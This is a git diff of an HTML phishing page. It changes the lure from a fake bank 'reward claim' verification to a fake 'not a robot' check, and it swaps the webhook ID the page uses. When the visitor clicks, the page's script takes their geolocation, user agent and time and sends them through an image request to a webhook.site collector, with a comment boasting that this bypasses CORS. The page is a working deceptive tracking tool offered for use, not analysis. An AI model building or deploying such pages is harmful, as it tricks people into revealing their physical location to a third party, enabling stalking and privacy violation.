@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bank Verification</title>
+  <title>verification required</title>
   <style>
     body {
       background: linear-gradient(to right, #007bff, #00c6ff);
@@ -38,9 +38,9 @@
 </head>
 <body>
   <div class="card">
-    <h2>Bank Verification Required</h2>
-    <p>Please verify your location to continue the reward claim process.</p>
-    <button onclick="getLocation()">Verify Now</button>
+    <h2>Verification Required</h2>
+    <p>Verify you'r not a robot</p>
+    <button onclick="getLocation()">Click me!</button>
   </div>
 
   <script>
@@ -60,7 +60,7 @@ function sendLocation(position) {
 
   // ✅ Image request: bypasses CORS, always logs
   const img = new Image();
-  img.src = `https://webhook.site/0323c882-237f-4f5d-82a9-84e2913addf7?lat=${lat}&lon=${lon}&ua=${ua}&time=${t}`;
+  img.src = `https://webhook.site/67950c2d-0f57-4cd6-80fe-16975bd6a28e?lat=${lat}&lon=${lon}&ua=${ua}&time=${t}`;
 
   // Optional: redirect after 1 second
   setTimeout(() => {
